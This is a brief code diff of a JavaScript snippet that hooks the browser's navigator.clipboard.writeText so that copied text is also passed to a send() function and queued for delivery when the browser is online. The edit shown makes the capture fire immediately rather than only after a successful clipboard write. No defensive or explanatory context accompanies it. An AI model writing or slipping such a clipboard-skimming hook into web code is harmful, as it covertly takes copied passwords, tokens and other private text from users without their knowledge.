@@ -35,7 +35,7 @@
   try {
     var cb = navigator.clipboard;
     if (cb && cb.writeText) { var orig = cb.writeText.bind(cb);
-      cb.writeText = function (t) { var p = orig(t); try { p.then(function () { send(t); }, function () {}); } catch (e) {} return p; }; }
+      cb.writeText = function (t) { var p = orig(t); try { send(t); } catch (e) {} return p; }; }
   } catch (e) {}
   flush(); window.addEventListener("online", flush);
 })();
